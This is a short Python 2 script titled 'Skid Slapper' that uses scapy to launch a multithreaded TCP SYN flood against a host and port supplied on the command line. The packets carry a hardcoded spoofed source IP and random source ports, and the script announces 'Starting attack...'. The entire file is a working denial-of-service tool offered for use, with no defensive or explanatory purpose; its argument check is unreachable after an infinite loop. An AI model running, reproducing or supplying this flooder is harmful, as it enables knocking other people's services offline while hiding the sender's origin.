#!/usr/bin/python

import logging
from scapy.all import *
from time import sleep
import thread
import signal
import sys

print "\n:: Skid Slapper = coded by Codex-DoX ::\n\n"

target = str(sys.argv[1])
ddport = int(sys.argv[2])
threads = int(sys.argv[3])

def tcpdos(target,ddport):
	while 1:
		try:
			x = random.randint(1024,65535) #random source port (sport)
			spoof="172.17.130.12" #Spoof source IP		
			send(IP(dst=target, src=spoof)/TCP(sport=x, dport=ddport,flags="S"),verbose=1)

		except:
			pass

def shutdown(signal, frame):
	print '\nCtrl+C was pressed, shutting down!'
	sys.exit()
signal.signal(signal.SIGINT, shutdown)
print "Use Ctrl+C to stop the attack\n"
print "Starting attack..."
sleep(2)
for t in range(0,threads):
	thread.start_new_thread(tcpdos, (target,ddport))
	
while 1:
	sleep(1)

if len(sys.argv) != 4:
	print "Usage: python skid.py <Target> <Port> <Threads>"
	sys.exit()
